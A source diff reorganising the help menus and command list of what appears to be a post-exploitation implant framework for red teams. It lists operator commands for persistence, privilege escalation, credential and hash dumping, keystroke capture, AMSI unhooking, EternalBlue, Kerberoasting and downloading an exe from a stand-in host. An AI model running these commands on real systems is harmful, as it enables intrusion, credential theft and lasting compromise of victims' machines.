@@ -249,8 +249,6 @@ get-proxy
 get-computerinfo
 unzip <source file> <destination folder>
 get-system
-get-system-withproxy
-get-system-withdaisy
 get-implantworkingdirectory
 get-pid
 posh-delete c:\\temp\\svc.exe
@@ -306,26 +304,29 @@ dir -recurse | select-string -pattern 'password='
 
 posh_help3 = Colours.GREEN + """
 File Management:
-====================
+=================
 download-file -source 'c:\\temp dir\\run.exe'
 download-files -directory 'c:\\temp dir\\'
 upload-file -source 'c:\\temp\\run.exe' -destination 'c:\\temp\\test.exe'
 web-upload-file -from 'http://www.example.com/app.exe' -to 'c:\\temp\\app.exe'
 
-Persistence:
-================
+Persistence (with powershell.exe):
+====================================
 install-persistence 1,2,3
 remove-persistence 1,2,3
-installexe-persistence
-removeexe-persistence
-install-servicelevel-persistence | remove-servicelevel-persistence
-install-servicelevel-persistencewithproxy | remove-servicelevel-persistence
+install-servicelevel-persistence
+remove-servicelevel-persistence
 invoke-wmievent -name backup -command "powershell -enc abc" -hour 10 -minute 30
 get-wmievent
 remove-wmievent -name backup
 
+Persistence:
+=============
+installexe-persistence
+removeexe-persistence
+
 Network Tasks / Lateral Movement:
-==================
+==================================
 get-externalip
 test-adcredential -domain test -user ben -password password1
 invoke-smblogin -target 192.168.100.20 -domain testdomain -username test -hash/-password
@@ -559,7 +560,7 @@ COMMANDS = ['loadmodule', "invoke-bloodhound", "brute-ad", "brute-locadmin",
             "get-forestdomain", "test-connection", "get-netdomaincontroller", "invoke-pbind", "pbind-command", "invoke-kerberoast", "invoke-userhunter",
             "get-process", "start-process", "searchhelp", "get-netshare", "pbind-kill", "pbind-loadmodule", "install-servicelevel-persistencewithproxy",
             "install-servicelevel-persistence", "remove-servicelevel-persistence", "reversedns", "invoke-eternalblue", "get-ipconfig",
-            "loadmoduleforce", "unhook-amsi", "get-implantworkingdirectory", "get-system", "get-system-withproxy", "get-system-withdaisy",
+            "loadmoduleforce", "unhook-amsi", "get-implantworkingdirectory", "get-system",
             "get-pid", "listmodules", "modulesloaded", "startanotherimplant", "remove-persistence", "removeexe-persistence",
             "installexe-persistence", "get-hash", "get-creds", "resolve-ipaddress", "create-shortcut",
             "invoke-wmievent", "remove-wmievent", "get-wmievent", "invoke-smbclient", "get-keystrokedata", "unhidefile", "hidefile", "remove-label", "label-implant",
